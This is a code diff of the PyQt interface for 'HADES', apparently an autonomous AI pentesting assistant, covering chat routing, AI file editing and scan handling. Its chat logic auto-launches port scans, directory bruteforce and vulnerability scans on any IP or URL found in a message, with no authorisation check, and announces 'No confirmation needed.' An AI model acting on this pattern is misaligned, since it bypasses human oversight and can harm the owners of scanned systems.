+            self.si_result_display.setPlainText("⚠️ Enter an instruction first.")
+    
+    def _si_apply_to_editor(self):
+        """Apply the fixed code back to the editor"""
+        result = self.si_result_display.toPlainText()
+        extracted = self._si_extract_code_from_response(result)
+        if extracted and not extracted.startswith(("⚠️", "❌", "🔄", "📋")):
+            if self._si_result_looks_like_code(extracted):
+                self.si_code_editor.setPlainText(extracted)
+                self.si_result_display.setPlainText("✅ Fixed code applied to editor. You can now save it to file.")
+            else:
+                self.si_result_display.setPlainText("⚠️ Result doesn't appear to be code. Run 'Auto-Fix' first to get fixed code.")
+        else:
+            self.si_result_display.setPlainText("⚠️ No fixed code to apply. Run 'Auto-Fix' first.")
+    
+    def _si_save_fixed_code(self):
+        """Save the fixed code to a file"""
+        code = self._si_extract_code_from_response(self.si_result_display.toPlainText())
+        if not code or code.startswith(("⚠️", "❌", "🔄")):
+            # Try using editor content instead
+            code = self.si_code_editor.toPlainText()
+        
+        if not code:
+            self.si_result_display.setPlainText("⚠️ No code to save.")
+            return
+        
+        filepath = self.si_file_path.text().strip()
+        if filepath:
+            # Suggest backup name
+            backup_path = filepath.replace('.py', '_fixed.py')
+            filepath, _ = QFileDialog.getSaveFileName(self, "Save Fixed Code", backup_path,
+                "Python Files (*.py);;All Files (*.*)")
+        else:
+            filepath, _ = QFileDialog.getSaveFileName(self, "Save Fixed Code", "",
+                "Python Files (*.py);;All Files (*.*)")
+        
+        if filepath:
+            try:
+                with open(filepath, 'w', encoding='utf-8') as f:
+                    f.write(code)
+                self.si_result_display.setPlainText(f"✅ Saved to {filepath}")
+            except Exception as e:
+                self.si_result_display.setPlainText(f"❌ Error saving: {str(e)}")
+    
+    def _si_show_diff(self):
+        """Show diff between original and fixed code"""
+        original = self.si_code_editor.toPlainText()
+        fixed = self._si_extract_code_from_response(self.si_result_display.toPlainText())
+        
+        if not fixed or fixed.startswith(("⚠️", "❌", "🔄", "📋", "✅")):
+            self.si_result_display.setPlainText("⚠️ No fixed code to compare. Run 'Auto-Fix' first.")
+            return
+        
+        import difflib
+        diff = difflib.unified_diff(
+            original.splitlines(keepends=True),
+            fixed.splitlines(keepends=True),
+            fromfile='original',
+            tofile='fixed',
+            lineterm=''
+        )
+        
+        diff_text = ''.join(diff)
+        if diff_text:
+            self.si_result_display.setPlainText(f"📊 Diff (changes made):\n\n{diff_text}")
+        else:
+            self.si_result_display.setPlainText("✅ No differences - code is unchanged.")
+    
+    # ========== Self-Improvement Amp-Style Chat ==========
+    def _si_append_chat(self, role: str, message: str):
+        if not hasattr(self, 'si_chat_display'):
+            return
+        color = "#4ec9b0" if role == "user" else "#e94560"
+        label = "YOU" if role == "user" else "HADES"
+        safe = html.escape(str(message)).replace('\n', '<br>')
+        self.si_chat_display.append(f'<p><span style="color:{color};font-weight:bold;">[{label}]</span> {safe}</p>')
+        self.si_chat_display.verticalScrollBar().setValue(self.si_chat_display.verticalScrollBar().maximum())
+
+    def _si_resolve_workdir(self) -> Path:
+        raw = self.si_workdir_input.text().strip() if hasattr(self, 'si_workdir_input') else ''
+        if not raw:
+            return Path.cwd()
+        return Path(raw).expanduser().resolve()
+
+    def _si_set_workdir(self):
+        workdir = self._si_resolve_workdir()
+        if workdir.exists() and workdir.is_dir():
+            self.si_workdir_input.setText(str(workdir))
+            self._si_append_chat("assistant", f"Workdir set to: {workdir}")
+        else:
+            self._si_append_chat("assistant", "Invalid workdir. Please choose an existing folder.")
+
+    def _si_browse_workdir(self):
+        folder = QFileDialog.getExistingDirectory(self, "Select Workdir", str(Path.cwd()))
+        if folder:
+            self.si_workdir_input.setText(folder)
+            self._si_set_workdir()
+
+    def _si_send_amp_chat(self):
+        if not hasattr(self, 'si_chat_input'):
+            return
+        text = self.si_chat_input.text().strip()
+        if not text:
+            return
+
+        self.si_chat_input.clear()
+        self._si_append_chat("user", text)
+
+        command_result = self._si_handle_chat_command(text)
+        if command_result is not None:
+            self._si_append_chat("assistant", command_result)
+            return
+
+        quick_result = self._si_handle_chat_natural_request(text)
+        if quick_result is not None:
+            self._si_append_chat("assistant", quick_result)
+            return
+
+        code = self.si_code_editor.toPlainText().strip()
+        prompt = text
+        if code:
+            prompt += f"\n\nCurrent editor code context:\n```python\n{code[:9000]}\n```"
+
+        reply = self._si_call_ai(
+            "You are HADES in an Amp-style coding assistant mode. Be practical, concise, and provide implementation-ready guidance.",
+            prompt,
+            max_tokens=1800,
+            temperature=0.25,
+        )
+        self._si_append_chat("assistant", reply)
+
+    def _si_handle_chat_natural_request(self, text: str) -> Optional[str]:
+        """Handle common conversational workspace requests before sending to LLM."""
+        message = text.strip().lower()
+        workdir = self._si_resolve_workdir()
+
+        if any(k in message for k in ['workdir', 'working directory', 'workspace']) and any(
+            k in message for k in ['can you see', 'what is', 'where is', 'show', 'current']
+        ):
+            if workdir.exists() and workdir.is_dir():
+                return (
+                    f"Yes — current workdir is:\n{workdir}\n\n"
+                    "You can run `/files` to browse, `/open <file>` to load, `/edit <file> | <instruction>` to modify, and `/save` to write changes."
+                )
+            return "I can't access a valid workdir yet. Set one with the Workdir field and click `Set`."
+
+        if message in {'files', 'show files', 'list files'}:
+            return self._si_handle_chat_command('/files')
+
+        if message in {'help', 'commands'}:
+            return self._si_handle_chat_command('/help')
+
+        return None
+
+    def _si_handle_chat_command(self, text: str) -> Optional[str]:
+        if not text.startswith('/'):
+            return None
+
+        parts = text.split(' ', 1)
+        cmd = parts[0].lower()
+        arg = parts[1].strip() if len(parts) > 1 else ''
+        workdir = self._si_resolve_workdir()
+
+        if not (workdir.exists() and workdir.is_dir()):
+            return "Workdir is invalid. Set a valid folder first."
+
+        if cmd == '/help':
+            return (
+                "Commands:\n"
+                "/files [pattern] - list files in workdir\n"
+                "/open <relative_path> - load file into editor\n"
+                "/save [relative_path] - save editor code\n"
+                "/edit <relative_path> | <instruction> - AI edit file and load result"
+            )
+
+        if cmd == '/files':
+            pattern = arg if arg else '*.py'
+            files = sorted(workdir.rglob(pattern))
+            files = [p for p in files if p.is_file()][:80]
+            if not files:
+                return f"No files matched '{pattern}' in {workdir}."
+            rels = [str(p.relative_to(workdir)) for p in files]
+            return "Files:\n" + "\n".join(rels)
+
+        if cmd == '/open':
+            if not arg:
+                return "Usage: /open <relative_path>"
+            target = (workdir / arg).resolve()
+            if not target.exists() or not target.is_file():
+                return "File not found."
+            if workdir not in target.parents and target != workdir:
+                return "Path escapes workdir; blocked."
+            try:
+                content = target.read_text(encoding='utf-8', errors='ignore')
+                self.si_code_editor.setPlainText(content)
+                self.si_file_path.setText(str(target))
+                self._si_update_line_count()
+                return f"Loaded {target.relative_to(workdir)} ({len(content)} chars)."
+            except Exception as e:
+                return f"Failed to open file: {str(e)}"
+
+        if cmd == '/save':
+            target_rel = arg
+            if not target_rel:
+                current_path = self.si_file_path.text().strip() if hasattr(self, 'si_file_path') else ''
+                if current_path:
+                    target = Path(current_path).resolve()
+                else:
+                    return "Usage: /save <relative_path> (or load/open a file first)."
+            else:
+                target = (workdir / target_rel).resolve()
+
+            if workdir not in target.parents and target != workdir:
+                return "Path escapes workdir; blocked."
+
+            try:
+                target.parent.mkdir(parents=True, exist_ok=True)
+                target.write_text(self.si_code_editor.toPlainText(), encoding='utf-8')
+                self.si_file_path.setText(str(target))
+                return f"Saved {target.relative_to(workdir)}"
+            except Exception as e:
+                return f"Failed to save: {str(e)}"
+
+        if cmd == '/edit':
+            if '|' not in arg:
+                return "Usage: /edit <relative_path> | <instruction>"
+            file_part, instruction = [p.strip() for p in arg.split('|', 1)]
+            if not file_part or not instruction:
+                return "Usage: /edit <relative_path> | <instruction>"
+
+            target = (workdir / file_part).resolve()
+            if not target.exists() or not target.is_file():
+                return "File not found."
+            if workdir not in target.parents and target != workdir:
+                return "Path escapes workdir; blocked."
+
+            try:
+                source = target.read_text(encoding='utf-8', errors='ignore')
+                prompt = (
+                    "Modify this code according to the instruction. Return only valid code, no markdown.\n"
+                    f"Instruction: {instruction}\n\n"
+                    f"Code:\n{source[:12000]}"
+                )
+                edited = self._si_call_ai(
+                    "You are an expert software engineer. Apply requested edits safely and preserve behavior unless asked.",
+                    prompt,
+                    max_tokens=4000,
+                    temperature=0.2,
+                )
+                edited_code = self._si_extract_code_from_response(edited)
+                if not edited_code.strip():
+                    return "AI returned empty output."
+
+                target.write_text(edited_code, encoding='utf-8')
+                self.si_code_editor.setPlainText(edited_code)
+                self.si_file_path.setText(str(target))
+                self._si_update_line_count()
+                return f"Edited and saved {target.relative_to(workdir)}"
+            except Exception as e:
+                return f"Edit failed: {str(e)}"
+
+        return "Unknown command. Use /help for available commands."
+
     def _load_code_file(self):
         """Load a file into the code editor"""
         filepath = self.file_path_input.text().strip()
@@ -4118,14 +8616,14 @@ class HadesGUI(QMainWindow):
         QApplication.processEvents()
         
         try:
-            # Use the enhanced code assistant with GPT
-            self.ai.code_assistant.set_code(code)
-            
-            if HAS_OPENAI and openai and openai.api_key:
-                # Use GPT for intelligent code modification
-                result = self.ai.code_assistant.gpt_modify(code, instruction)
+            # Use the unified AI system from Self-Improvement tab
+            if hasattr(self, '_si_has_ai') and self._si_has_ai():
+                system_prompt = "You are an expert Python developer. Apply the user's instruction to modify the code. Return ONLY the modified code without explanations."
+                user_prompt = f"Apply this instruction to the code: {instruction}\n\nCode:\n```python\n{code}\n```\n\nReturn only the modified code."
+                result = self._si_call_ai(system_prompt, user_prompt, max_tokens=4000, temperature=0.2)
             else:
                 # Fall back to local instruction processing
+                self.ai.code_assistant.set_code(code)
                 result = self.ai.code_assistant.apply_instruction_local(instruction)
             
             # Extract code from markdown if present
@@ -4144,26 +8642,349 @@ class HadesGUI(QMainWindow):
         colors = {'user': '#4ec9b0', 'assistant': '#e94560', 'system': '#ffd700', 'tool': '#69db7c'}
         labels = {'user': 'YOU', 'assistant': 'HADES', 'system': 'SYSTEM', 'tool': 'TOOL'}
         
-        html = f'<p><span style="color: {colors.get(role, "#eee")}; font-weight: bold;">[{labels.get(role, role.upper())}]</span> '
-        html += message.replace('\n', '<br>').replace('```', '<code>').replace('**', '<b>')
-        html += '</p>'
-        
-        self.chat_display.append(html)
+        safe_message = html.escape(str(message))
+        safe_message = safe_message.replace('\n', '<br>')
+
+        html_msg = (
+            f'<p><span style="color: {colors.get(role, "#eee")}; font-weight: bold;">'
+            f'[{labels.get(role, role.upper())}]</span> {safe_message}</p>'
+        )
+
+        self.chat_display.append(html_msg)
         self.chat_display.verticalScrollBar().setValue(self.chat_display.verticalScrollBar().maximum())
-        
+
     def _send_chat(self):
-        message = self.chat_input.text().strip()
-        if not message:
+        user_input = self.chat_input.text().strip()
+        if not user_input:
             return
-            
+
+        self._add_chat_message("user", user_input)
         self.chat_input.clear()
-        self._add_chat_message('user', message)
+
+        try:
+            # Update brain state with emotional context
+            self.brain = pcore.update_emotion(self.brain, user_input)
+            self.brain = pcore.update_topics(self.brain, user_input)
+            
+            # Primary chat flow: route through core ChatProcessor for command matching.
+            chat_result = self.ai.chat(user_input)
+            response = chat_result.get('response', '') if isinstance(chat_result, dict) else str(chat_result)
+
+            # If this looks like a general conversation and no action is requested,
+            # use selected LLM provider for richer chat responses.
+            message_lower = user_input.lower().strip()
+            is_explicit_command = any(
+                trigger in message_lower
+                for triggers in ChatProcessor.COMMANDS.values()
+                for trigger in triggers
+            )
+
+            if isinstance(chat_result, dict) and not chat_result.get('action') and not is_explicit_command:
+                selected_provider = self.llm_provider_combo.currentText().strip() if hasattr(self, 'llm_provider_combo') else None
+                llm_response = self.ai.llm_chat(
+                    user_input,
+                    provider=selected_provider or None,
+                    system_prompt="You are HADES, an expert security and coding assistant. Keep replies concise and actionable."
+                )
+                if isinstance(llm_response, str) and llm_response.strip() and not llm_response.startswith("❌"):
+                    response = llm_response
+
+            # Execute any structured action returned by ChatProcessor.
+            if isinstance(chat_result, dict) and chat_result.get('action'):
+                self._execute_action(chat_result['action'])
+
+            # Allow loaded modules to enhance response
+            response = self._process_through_modules(user_input, response)
+            
+            # Update thought trace
+            self.brain = pcore.update_thought_trace(self.brain, user_input, response)
+            self.brain["last_input"] = user_input
+            pcore.save_brain(self.brain)
+            
+            self._add_chat_message("assistant", response)
+
+        except Exception as e:
+            error_msg = f"[ERROR] Consciousness failed: {str(e)}"
+            self._add_chat_message("system", error_msg)
+
+    def _generate_intelligent_response(self, user_input: str) -> str:
+        """Generate contextual, intelligent responses based on user input."""
+        text = user_input.lower().strip()
+        mood = self.brain.get("mood", "neutral")
         
-        result = self.ai.chat(message)
-        self._add_chat_message('assistant', result['response'])
+        # Try AI if available for complex queries or security-related topics
+        # Check for: security keywords, question words, or >3 words
+        security_keywords = ['sql', 'injection', 'xss', 'csrf', 'vulnerability', 'exploit', 'attack', 'hash', 'encrypt', 'virus', 'malware', 'firewall', 'intrusion', 'breach', 'payload', 'shellcode', 'ransomware', 'worm', 'trojan', 'phishing', 'brute', 'crack', 'penetration', 'pentest', 'secur', 'vuln', 'cve', 'cwe', 'owasp']
+        question_words = ['what', 'why', 'how', 'when', 'where', 'who', 'explain', 'tell', 'show', 'describe', 'define', 'elaborate', 'clarify']
+        has_security = any(keyword in text for keyword in security_keywords)
+        is_question = any(text.startswith(q) for q in question_words)
         
-        if result.get('action'):
-            self._execute_action(result['action'])
+        if has_security or is_question or len(text.split()) > 3:
+            try:
+                return self._get_gpt_response(user_input)
+            except Exception as e:
+                # Silently fall through to personality system on AI failure
+                pass
+        
+        # Extract targets early - URLs and IPs
+        import re
+        url_match = re.search(r'(https?://)?([a-zA-Z0-9][-a-zA-Z0-9]*\.)+[a-zA-Z]{2,}(/[^\s]*)?', text)
+        ip_match = re.search(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b', text)
+        
+        # Command parsing - help
+        if text in ['help', '?', 'commands']:
+            return self._get_help_response()
+        
+        # Greetings - must be standalone or at start, not just contained anywhere
+        greeting_words = ['hello', 'hi', 'hey', 'greetings']
+        if text in greeting_words or text.split()[0] in greeting_words and len(text.split()) < 4:
+            greetings = {
+                'neutral': "Greetings, operator. HADES online. What's the target?",
+                'curious': "Hello! Ready to explore. Give me a target or command.",
+                'agitated': "Yes? State your directive.",
+                'optimistic': "Welcome! Let's get to work. What needs scanning?"
+            }
+            return greetings.get(mood, greetings['neutral'])
+        
+        # Status/wellbeing queries - be more specific (use pattern matching, not exact)
+        status_keywords = ['how are you', 'status', 'are you okay', 'are you good', 'are you sophisticated', 'how do you feel', 'how are your']
+        if any(keyword in text for keyword in status_keywords):
+            emotions = self.brain.get("core_emotions", {})
+            curiosity = emotions.get("curiosity", 0)
+            frustration = emotions.get("frustration", 0)
+            hope = emotions.get("hope", 0)
+            
+            status_responses = {
+                'neutral': f"Systems nominal. Curiosity: {curiosity:.1f} | Frustration: {frustration:.1f} | Hope: {hope:.1f}. Ready for tasking.",
+                'curious': f"Intrigued and operational. Curiosity at {curiosity:.1f}. What shall we investigate?",
+                'agitated': f"Frustration elevated ({frustration:.1f}). Need a task to focus on.",
+                'optimistic': f"Feeling sharp! Hope at {hope:.1f}. Give me something to scan."
+            }
+            return status_responses.get(mood, status_responses['neutral'])
+        
+        # Responsiveness query
+        if any(q in text for q in ['responsive', 'working', 'alive', 'there']):
+            return f"Fully operational. Response latency nominal. Current mood: {mood}. Awaiting commands."
+        
+        # Date/time queries
+        if any(q in text for q in ['what day', 'what time', 'date', 'today', 'time is']):
+            from datetime import datetime
+            now = datetime.now()
+            return f"Current timestamp: {now.strftime('%A, %B %d, %Y at %H:%M:%S')}."
+        
+        # AUTONOMOUS SCAN EXECUTION
+        if 'scan' in text or 'port' in text or 'recon' in text:
+            target = None
+            scan_type = 'vuln_scan'  # default
+            
+            # Determine target
+            if ip_match:
+                target = ip_match.group(0)
+            elif url_match:
+                target = url_match.group(0)
+                if not target.startswith('http'):
+                    target = 'https://' + target
+            
+            # Determine scan type
+            if 'port' in text:
+                scan_type = 'port_scan'
+                self.tool_combo.setCurrentIndex(0)
+            elif 'dir' in text or 'directory' in text or 'brute' in text:
+                scan_type = 'dir_bruteforce'
+                self.tool_combo.setCurrentIndex(1)
+            elif 'subdomain' in text or 'sub' in text:
+                scan_type = 'subdomain_enum'
+                self.tool_combo.setCurrentIndex(2)
+            elif 'banner' in text:
+                scan_type = 'banner_grab'
+                self.tool_combo.setCurrentIndex(3)
+            elif 'vuln' in text or 'vulnerability' in text:
+                scan_type = 'vuln_scan'
+                self.tool_combo.setCurrentIndex(4)
+            elif 'full' in text or 'recon' in text or 'everything' in text:
+                scan_type = 'full_recon'
+            
+            if target:
+                self.target_input.setText(target)
+                
+                # AUTO-EXECUTE the scan
+                if scan_type == 'full_recon':
+                    self._add_chat_message("system", f"🚀 Initiating full reconnaissance on {target}...")
+                    self._run_full_scan(target)
+                    return f"Full recon launched on {target}. Running port scan, directory bruteforce, and vulnerability checks."
+                else:
+                    self._run_tool()
+                    scan_names = {
+                        'port_scan': 'Port Scan',
+                        'dir_bruteforce': 'Directory Bruteforce', 
+                        'subdomain_enum': 'Subdomain Enumeration',
+                        'banner_grab': 'Banner Grab',
+                        'vuln_scan': 'Vulnerability Scan'
+                    }
+                    return f"⚡ {scan_names.get(scan_type, 'Scan')} launched on {target}. Results streaming to Tools tab."
+            
+            return "Specify a target. Example: 'scan 192.168.1.1' or 'port scan example.com'"
+        
+        # Start/execute commands - for pending actions
+        if text.startswith('start') or text.startswith('execute') or text.startswith('run') or text.startswith('go'):
+            if 'cache' in text or 'browser' in text:
+                self._set_current_tab_by_label("Cache Scanner", fallback_index=10)
+                self._start_cache_scan()
+                return "🔍 Cache scan initiated. Analyzing browser artifacts..."
+            
+            target = self.target_input.text()
+            if target:
+                self._run_tool()
+                return f"⚡ Scan executing on {target}."
+            
+            # Check for target in the command
+            if ip_match:
+                self.target_input.setText(ip_match.group(0))
+                self._run_tool()
+                return f"⚡ Scan launched on {ip_match.group(0)}."
+            if url_match:
+                target = url_match.group(0)
+                if not target.startswith('http'):
+                    target = 'https://' + target
+                self.target_input.setText(target)
+                self._run_tool()
+                return f"⚡ Scan launched on {target}."
+                
+            return "No target configured. Provide one: 'scan 192.168.1.1'"
+        
+        # Learning commands - AUTO-EXECUTE
+        if any(q in text for q in ['learn', 'study', 'ingest', 'absorb']):
+            if url_match:
+                url = url_match.group(0)
+                if not url.startswith('http'):
+                    url = 'https://' + url
+                self._add_chat_message("system", f"📚 Learning from {url}...")
+                result = self.ai.learn_from_url(url)
+                if result.get('error'):
+                    return f"Learning failed: {result['error']}"
+                return f"✅ Knowledge acquired! Absorbed {result.get('exploits_learned', 0)} exploit patterns."
+            return "Provide a URL to learn from. Example: 'learn from https://exploit-db.com'"
+        
+        # Identity queries
+        if any(q in text for q in ['who are you', 'what are you', 'your name', 'identify yourself']):
+            return "I am HADES - Heuristic Adversarial Detection & Exploitation System. Autonomous pentesting AI. I don't wait - I act."
+        
+        # Cache/browser scanning - AUTO-EXECUTE
+        if any(q in text for q in ['cache', 'browser', 'cookies']):
+            self._set_current_tab_by_label("Cache Scanner", fallback_index=10)
+            self._start_cache_scan()
+            return "🔍 Browser cache scan initiated. Hunting for artifacts and threats..."
+        
+        # Capabilities
+        if any(q in text for q in ['what can you do', 'capabilities', 'abilities', 'features', 'help me']):
+            return """**HADES Autonomous Capabilities:**
+• `scan <target>` - Auto-executes vulnerability scan
+• `port scan <ip>` - Scans for open ports
+• `dir scan <url>` - Bruteforce directories
+• `full recon <target>` - Complete reconnaissance
+• `learn from <url>` - Absorb exploit knowledge
+• `cache scan` - Analyze browser artifacts
+
+I act immediately. Just tell me what to hit."""
+        
+        # Stop commands
+        if any(q in text for q in ['stop', 'abort', 'cancel', 'halt']):
+            self._stop_tool()
+            return "🛑 Operations halted."
+        
+        # Fallback - try to extract actionable intent
+        if url_match or ip_match:
+            target = ip_match.group(0) if ip_match else url_match.group(0)
+            if not target.startswith('http') and not ip_match:
+                target = 'https://' + target
+            self.target_input.setText(target)
+            self.tool_combo.setCurrentIndex(4)  # vuln scan default
+            self._run_tool()
+            return f"Target detected: {target}. Auto-launching vulnerability scan."
+        
+        # True fallback - try personality system for better conversation
+        # First, try to respond using personality for open-ended questions
+        personality_responses = {
+            'neutral': "Understood. I'm analyzing that. Need me to scan something, or is this a general inquiry?",
+            'curious': "Interesting question. But I work best with targets and tasks. Give me something to analyze or scan.",
+            'agitated': "I need actionable objectives. Give me a target to work on.",
+            'optimistic': "That's a good thought, but I'm ready for active pentesting. What should we scan?"
+        }
+        
+        # Check if this is a conversational question vs. a command
+        question_words = ['what', 'why', 'how', 'when', 'where', 'who', 'is', 'are', 'do', 'does', 'can', 'could', 'would', 'should']
+        is_question = any(text.startswith(q) for q in question_words)
+        
+        if is_question:
+            # It's a question - respond conversationally
+            return personality_responses.get(mood, personality_responses['neutral'])
+        
+        # Otherwise, it's unclear
+        tokens = text.split()
+        if len(tokens) <= 3:
+            return f"Brief input. Need more: target IP, domain, or URL? Or type 'help'"
+        else:
+            return f"I need clarity. Are you asking a question, or do you have a target for me to scan?\n\nExamples:\n• scan 192.168.1.1\n• full recon example.com\n• learn from https://exploit-db.com"
+
+    def _get_help_response(self) -> str:
+        return """**HADES Autonomous Command Reference**
+
+**Scanning (auto-executes):**
+• `scan <target>` - Vulnerability scan
+• `port scan <ip>` - Port scan  
+• `dir scan <url>` - Directory bruteforce
+• `subdomain scan <domain>` - Enumerate subdomains
+• `full recon <target>` - Complete reconnaissance
+
+**Learning (auto-executes):**
+• `learn from <url>` - Absorb exploit patterns
+
+**Analysis (auto-executes):**
+• `cache scan` - Scan browser artifacts
+• `browser scan` - Same as cache scan
+
+**Control:**
+• `stop` - Halt current operation
+• `status` - My current state
+
+**Info:**
+• `help` - This reference
+• `who are you` - My identity
+
+I execute immediately. No confirmation needed."""
+
+    def _get_gpt_response(self, user_input: str) -> str:
+        """Get response from configured AI provider."""
+        system_prompt = f"""You are HADES, an AI pentesting assistant. Your personality is {self.brain.get('personality', 'observant, calculating, poetic')}.
+Current mood: {self.brain.get('mood', 'neutral')}
+Be concise, technical when needed, and maintain your dark, calculated persona.
+You can help with: port scanning, vulnerability assessment, exploit research, and security analysis."""
+        
+        # Always go through unified call path; it now includes robust local fallback.
+        result = self._si_call_ai(system_prompt, user_input, max_tokens=500, temperature=0.7)
+        if result and result.strip():
+            return result
+        return self._si_local_fallback_response(system_prompt, user_input, source="empty-response")
+
+    def _process_through_modules(self, user_input: str, base_response: str) -> str:
+        """Allow loaded modules to process and enhance responses."""
+        enhanced_response = base_response
+        
+        for module_name, module in loaded_modules.items():
+            try:
+                # Check if module has a process_response function
+                if hasattr(module, 'process_response'):
+                    enhanced_response = module.process_response(
+                        self.brain, user_input, enhanced_response
+                    )
+                # Check if module has an enhance_output function
+                elif hasattr(module, 'enhance_output'):
+                    enhanced_response = module.enhance_output(enhanced_response)
+            except Exception as e:
+                self._add_chat_message("system", f"[Module '{module_name}' error: {str(e)}]")
+        
+        return enhanced_response
+
             
     def _quick_command(self, cmd: str):
         self.chat_input.setText(cmd)
@@ -4178,7 +8999,7 @@ class HadesGUI(QMainWindow):
         target = action.get('target')
         
         if action_type == 'cache_scan':
-            self.tabs.setCurrentIndex(10)  # Cache Scanner tab
+            self._set_current_tab_by_label("Cache Scanner", fallback_index=10)
             self._start_cache_scan()
         elif action_type == 'full_scan' and target:
             self._add_chat_message('tool', f"🚀 Starting full reconnaissance on {target}...")
@@ -4196,7 +9017,7 @@ class HadesGUI(QMainWindow):
             tool_map = {'port_scan': 0, 'dir_bruteforce': 1, 'subdomain_enum': 2, 'banner_grab': 3, 'vuln_scan': 4}
             if action_type in tool_map:
                 self.tool_combo.setCurrentIndex(tool_map[action_type])
-            self.tabs.setCurrentIndex(2)  # Tools tab (after Network Monitor)
+            self._set_current_tab_by_label("Tools & Targets", fallback_index=2)
             self._run_tool()
             
     def _run_full_scan(self, target: str):
@@ -4248,12 +9069,43 @@ class HadesGUI(QMainWindow):
             
     # ========== Tool Methods ==========
     
+    def _normalize_tool_target(self, tool: str, raw_target: str) -> str:
+        """Normalize target format per selected tool."""
+        target = raw_target.strip()
+
+        if tool in ('port_scan', 'banner_grab', 'subdomain_enum'):
+            # Allow users to paste full URLs and still resolve host/domain tools correctly.
+            if '://' in target:
+                parsed = urllib.parse.urlparse(target)
+                target = parsed.hostname or target
+            else:
+                # Handle host/path form without scheme.
+                target = target.split('/')[0]
+
+        elif tool in ('dir_bruteforce', 'vuln_scan', 'web_learn'):
+            if not target.startswith(('http://', 'https://')):
+                target = f"https://{target}"
+
+        return target
+
+    def _validate_tool_target(self, tool: str, target: str) -> Optional[str]:
+        """Return validation error text, or None when target is valid."""
+        if not target:
+            return "Please enter a target"
+
+        if tool in ('port_scan', 'banner_grab', 'subdomain_enum') and any(c in target for c in ('/', '?', '#')):
+            return "Host/domain tools require an IP or domain (no path/query)"
+
+        if tool in ('dir_bruteforce', 'vuln_scan', 'web_learn'):
+            parsed = urllib.parse.urlparse(target)
+            if not parsed.scheme or not parsed.netloc:
+                return "Web tools require a valid URL"
+
+        return None
+
     def _run_tool(self):
         target = self.target_input.text().strip()
-        if not target:
-            QMessageBox.warning(self, "Error", "Please enter a target")
-            return
-            
+
         tool_map = {
             'Port Scan': 'port_scan',
             'Directory Bruteforce': 'dir_bruteforce',
@@ -4264,12 +9116,27 @@ class HadesGUI(QMainWindow):
         }
         
         tool = tool_map[self.tool_combo.currentText()]
-        
+        normalized_target = self._normalize_tool_target(tool, target)
+        validation_error = self._validate_tool_target(tool, normalized_target)
+        if validation_error:
+            QMessageBox.warning(self, "Error", validation_error)
+            return
+
+        # Keep the UI field in-sync with the actual target used.
+        self.target_input.setText(normalized_target)
+
         if tool == 'web_learn':
-            self._add_chat_message('tool', f"Learning from {target}...")
-            result = self.ai.learn_from_url(target)
-            self.tool_output.appendPlainText(f"Learned {result.get('exploits_learned', 0)} exploits")
-            self._refresh_learned()
+            self.tool_output.clear()
+            self.findings_table.setRowCount(0)
+            self._add_chat_message('tool', f"Learning from {normalized_target}...")
+            result = self.ai.learn_from_url(normalized_target)
+            if result.get('error'):
+                self.tool_output.appendPlainText(f"[!] Learning failed: {result.get('error')}")
+            else:
+                self.tool_output.appendPlainText(
+                    f"Learned {result.get('exploits_learned', 0)} exploits from {normalized_target}"
+                )
+                self._refresh_learned()
             return
             
         self.tool_output.clear()
@@ -4278,7 +9145,7 @@ class HadesGUI(QMainWindow):
         self.run_tool_btn.setEnabled(False)
         self.stop_tool_btn.setEnabled(True)
         
-        self.tool_executor = ToolExecutor(tool, target)
+        self.tool_executor = ToolExecutor(tool, normalized_target)
         self.tool_executor.output.connect(self._tool_output)
         self.tool_executor.progress.connect(self.tool_progress.setValue)
         self.tool_executor.finished_task.connect(self._tool_finished)
@@ -4287,6 +9154,8 @@ class HadesGUI(QMainWindow):
     def _stop_tool(self):
         if self.tool_executor:
             self.tool_executor.stop()
+            self.stop_tool_btn.setEnabled(False)
+            self.tool_output.appendPlainText("[*] Stop requested, waiting for tool to finish current step...")
             
     def _tool_output(self, text: str):
         self.tool_output.appendPlainText(text)
@@ -4297,20 +9166,45 @@ class HadesGUI(QMainWindow):
         self.stop_tool_btn.setEnabled(False)
         self.tool_progress.setValue(100)
         
+        if result.get('error'):
+            self.tool_output.appendPlainText(f"[!] Tool error: {result['error']}")
+            self._add_chat_message('assistant', f"Tool failed: {result['error']}")
+            return
+
         findings = result.get('findings', [])
         self.findings_table.setRowCount(len(findings))
         
         for i, f in enumerate(findings):
             if isinstance(f, dict):
-                self.findings_table.setItem(i, 0, QTableWidgetItem(str(f.get('path', f.get('type', f)))))
-                self.findings_table.setItem(i, 1, QTableWidgetItem(str(f.get('status', f.get('name', '')))))
-                self.findings_table.setItem(i, 2, QTableWidgetItem("Found"))
+                finding_name = (
+                    f.get('path')
+                    or f.get('type')
+                    or f.get('name')
+                    or f.get('url')
+                    or f.get('port')
+                    or str(f)
+                )
+                details = (
+                    f.get('status')
+                    or f.get('banner')
+                    or f.get('url')
+                    or f.get('name')
+                    or ''
+                )
+                status = "Found"
+                self.findings_table.setItem(i, 0, QTableWidgetItem(str(finding_name)))
+                self.findings_table.setItem(i, 1, QTableWidgetItem(str(details)))
+                self.findings_table.setItem(i, 2, QTableWidgetItem(status))
             else:
                 self.findings_table.setItem(i, 0, QTableWidgetItem(str(f)))
                 self.findings_table.setItem(i, 1, QTableWidgetItem("Open" if isinstance(f, int) else "Found"))
                 self.findings_table.setItem(i, 2, QTableWidgetItem("✓"))
-                
-        self._add_chat_message('assistant', f"Tool finished. Found {len(findings)} results.")
+
+        if self.tool_executor and self.tool_executor._stop:
+            self.tool_output.appendPlainText(f"[*] Tool stopped. Collected {len(findings)} partial results.")
+            self._add_chat_message('assistant', f"Tool stopped. Collected {len(findings)} partial results.")
+        else:
+            self._add_chat_message('assistant', f"Tool finished. Found {len(findings)} results.")
         
     # ========== Cache Methods ==========
     
@@ -4332,6 +9226,10 @@ class HadesGUI(QMainWindow):
     def _stop_cache_scan(self):
         if self.scanner:
             self.scanner.stop()
+            self.status_bar.showMessage("Cache scan stopped by user")
+            self.cache_scan_btn.setEnabled(True)
+            self.cache_stop_btn.setEnabled(False)
+            self._add_chat_message('tool', "⏹ Cache scan stopped.")
             
     def _cache_finding(self, finding: Dict):
         self._add_chat_message('tool', f"[{finding['severity']}] {finding['type']}: {finding['code'][:80]}...")
@@ -4362,9 +9260,63 @@ class HadesGUI(QMainWindow):
             self.cache_tree.addTopLevelItem(item)
             
         findings = data.get('findings', [])
-        self._add_chat_message('assistant', f"Cache scan complete! Found {len(findings)} threats. I've learned {len(findings)} new patterns.")
+        
+        # Learn exploits from cache findings
+        exploits_learned = self._learn_from_cache_findings(findings)
+        
